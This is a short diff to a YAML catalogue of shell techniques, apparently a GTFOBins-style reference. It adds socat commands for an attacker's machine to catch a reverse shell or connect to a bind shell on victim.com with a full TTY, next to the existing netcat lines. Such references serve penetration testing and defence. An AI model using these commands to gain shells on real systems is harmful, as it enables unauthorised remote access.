@@ -30,6 +30,9 @@ reverse-shell:
       tcp-server:
         comment: A TCP server can be used on the attacker box to receive the shell.
         code: nc -l -p 12345
+      tcp-server-tty:
+        comment: A TCP server can be used on the attacker box to receive the shell.
+        code: socat file:/dev/tty,raw,echo=0 tcp-listen:12345
       tls-server:
         comment: A TLS server can be used on the attacker box to receive the shell.
         code: |-
@@ -49,6 +52,9 @@ bind-shell:
       tcp-client:
         comment: A TCP client can be used on the attacker box to connect to the shell.
         code: nc victim.com 12345
+      tcp-client-tty:
+        comment: A TCP client can be used on the attacker box to receive the shell.
+        code: socat file:/dev/tty,raw,echo=0 tcp:victim.com:12345
 
 file-write:
   label: File write
